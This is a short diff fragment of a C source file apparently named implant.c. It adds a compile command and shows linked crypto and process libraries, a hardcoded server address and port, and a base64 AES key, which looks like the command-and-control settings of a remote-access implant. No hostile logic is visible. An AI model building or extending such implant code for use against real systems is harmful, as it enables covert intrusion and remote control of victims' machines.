@@ -22,6 +22,8 @@
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "psapi.lib")
 
+// compile with cl /W4 /Zi /Fe implant.exe implant.c /link /libpath:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\um\x64" bcrypt.lib winhttp.lib
+
 #define SERVER L"192.168.1.19"
 #define PORT 443
 #define AES_KEY_BASE64 "xalxACRIZkmDkMYu-BB0ec49-Qzj7aByCHaEtgm1jwI"
